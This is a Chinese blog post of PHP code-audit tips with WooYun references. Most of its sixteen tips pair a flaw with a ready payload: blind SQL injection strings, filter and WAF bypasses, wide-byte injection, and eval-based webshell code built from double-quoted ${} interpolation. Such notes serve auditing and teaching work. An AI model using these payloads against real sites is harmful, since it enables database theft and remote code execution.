title: PHP代码审计tips
date: 2016-01-10 18:04:13
categories: [web]
tags: [随笔]
---
https://www.91ri.org/15074.html
<!--more-->
PHP代码审计tips
1、$_SERVER[‘PHP_SELF’]和$_SERVER[‘QUERY_STRING’]，而$_SERVER并没有转义，造成了注入。
例如：
```
/easy/index.php/aaa',(select/**/if((select/**/ord(substr(user(),1,1)))=114,sleep(3),0)),1)#
```
2、update更新时没有重构更新序列，导致更新其他关键字段（金钱、权限）

例如：

```
id=1&data=1991-03-16&money=10000000
```
http://www.wooyun.org/bugs/wooyun-2014-069507

3、在 php中 如果使用了一个未定义的常量，PHP 假定想要的是该常量本身的名字，如同用字符串调用它一样（CONSTANT 对应 “CONSTANT”）。此时将发出一个 E_NOTICE 级的错误（参考http://php.net/manual/zh/language.constants.syntax.php）

例如：

```
未定义常量if(IN_ADMIN != TRUE) 等式不成立，非0、null都为true
```
http://www.wooyun.org/bugs/wooyun-2014-069503

4、PHP中自编写对标签的过滤或关键字过滤，应放在strip_tags等去除函数之后，否则引起过滤绕过。
例如：

```
function mystrip_tags($string)
{
$string = remove_xss($string);
$string = new_html_special_chars($string);
$string = strip_tags($string);//remove_xss在strip_tags之前调用，所以很明显可以利用strip_tags函数绕过,在关键字中插入html标记.
return $string;
}
```
http://www.wooyun.org/bugs/wooyun-2014-070316

对关键字过滤之后存在字符替换、html去除等操作可构造多余字符绕过。

例如：提交

```
user/**/W<a>HERE/**/IF((S<a>ELECT/**/A<a>SCII(S<a>UBSTRING(PASSWORD,1,1))F<a>ROM/**/ts_user/**/L<a>IMIT 1)=101,1=S<a>LEEP(2.02),0)%23
```
由于全局关键字过滤之后存在strip_tags()函数可绕过。

http://www.wooyun.org/bugs/wooyun-2014-077877

http://www.wooyun.org/bugs/wooyun-2014-077689

5、当可控变量进入双引号中时可形成webshell
例如：

```
$a = "${@eval($_POST[s])}";
$a = "${${eval($_POST[s])}}";
```
因此代码执行使用${file_put_contents($_GET[f],$_GET[p])}可以生成webshell。

http://www.wooyun.org/bugs/wooyun-2014-085518

6、宽字节转编码过程中出现宽字节注入
```
例如：测试输入 \->%5C %e5%5c%5c' 两个\\ 则单引号出来
```
7、构造查询语句时无法删除目标表中不存在字段时可使用mysql多表查询绕过。

例如：
```
select uid,password from users,admins；
```
(uid存在于users、password存在于admins）
8、mysql中（反引号）能作为注释符，且会自动闭合末尾没有闭合的反引号。无法使用注释符的情况下使用别名as+反引号可闭合其后语句。

例如：
```
select `username`,`password` from pre_common_statuser as ` as statistic from common_stat where uid=1
```
此处（password from pre_common_statuser as ）为注入语句，使用别名as与自带无视其后语句。

http://www.wooyun.org/bugs/wooyun-2014-074970

9、mysql的类型强制转换可绕过PHP中empty()函数对0的false返回。

例如：提交
```
/?test=0axxx    -> empty($_GET['test']) => 返回真
```
但是mysql中提交其0axxx到数字型时强制转换成数字0

http://zone.wooyun.org/content/15859

10、存在全局过滤时观察过滤条件是否有if判断进入，cms可能存在自定义safekey不启用全局过滤。通过程序遗留或者原有界面输出safekey导致绕过。
例如：

Default
```
if($config['sy_istemplate']!='1' || md5(md5($config['sy_safekey']).$_GET['m'])!=$_POST['safekey'])
{
foreach($_POST as $id=>$v){
safesql($id,$v,"POST",$config);
$id = sfkeyword($id,$config);
$v = sfkeyword($v,$config);
$_POST[$id]=common_htmlspecialchars($v);
}
}
```
http://www.wooyun.org/bugs/wooyun-2014-070126

11、由于全局过滤存在白名单限定功能，可使用无用参数带入绕过。
例如：
```
if ($webscan_switch&&webscan_white($webscan_white_directory,$webscan_white_url))
```
其中具体过滤代码如下：

//后台白名单,后台操作将不会拦截,添加”|”隔开白名单目录下面默认是网址带 admin /dede/ 放行

```
$webscan_white_directory='admin|\/dede\/|\/install\/';
//url白名单,可以自定义添加url白名单,默认是对phpcms的后台url放行
//写法：比如phpcms 后台操作url index.php?m=admin php168的文章提交链接post.php?job=postnew&step=post ,dedecms 空间设置edit_space_info.php
```

```
$webscan_white_url = array('index.php' => 'admin_dir=admin','post.php' => 'job=postnew&step=post','edit_space_info.php'=>'');
```
只要让传入参数存在白名单目录或参数即可绕过。
利用白名单目录：

```
http://www.target.com/index.php/dede/?m=foo&c=bar&id=1' and 1=2 union select xxx
```
由于请求中包含了白名单目录/dede/，所以放行。
利用白名单参数：
```
http://www.target.com/index.php?m=foo&c=bar&admin_dir=admin&id=1' and 1=2 union select xxx
```
请求中包含了白名单参数所以放行。

http://www.wooyun.org/bugs/wooyun-2014-070126

12、字符串截断函数获取定长数据，截取\\或\’前一位，闭合语句。
利用条件必须是存在两个可控参数，前闭合，后注入。
例如：

```
if (strlen($u_email)>32) { $u_email = substring($u_email,32);}
if (strlen($u_qq)>16) { $u_qq = substring($u_qq,16);}
if (strlen($u_phone)>16) { $u_phone = substring($u_phone,16);}
$u_phone=123456789012345\ 带入：
UPDATE mac_user SET u_qq='$u_qq',u_email='$u_email',u_phone='123456789012345\',u_question='$u_question',u_answer='$u_answer',u_password='$u_password' WHERE u_id=1
http://www.wooyun.org/bugs/wooyun-2014-082973
```
13、过滤了空格，逗号的注入，可使用括号包裹绕过。具体如遇到select from（关键字空格判断的正则，且剔除/**/等）可使用括号包裹查询字段绕过。
例如：
```
select(location)from(website);
```
http://www.wooyun.org/bugs/wooyun-2014-079379

另外一种方式：
```
select{x table_name}from{x information_schema.tables}
select{x(name)}from{x(manager)};
select{wooyun'zone'}from{mysql.user}
select{x+table_name}from{x(information_schema.tables)}
```
14、由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。
例如：
```
in_array($_GET['x'],array(1,2,3,4,5))
访问?test=’1’testtest可判断成功。
```
http://www.freebuf.com/articles/web/55075.html

15、WAF或者过滤了and|or的情况可以使用&&与||进行盲注。
```
FALSE的情况：
1 || 0
TRUE的情况：
1 || 1
```
例如：
```
http://demo.74cms.com/user/user_invited.php?id=1%20||%20strcmp(substr(user(),1,13),char(114,111,111,116,64,108,111,99,97,108,104,111,115,116))&act=invited
```
16、windows下php中访问文件名使用”<” “>”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符。
例如：
```
file_get_contents("/images/".$_GET['a'].".jpg");
```
可使用test.php?a=../a<%00访问对应php文件。

http://www.phpbug.cn/archives/87.html#more-87
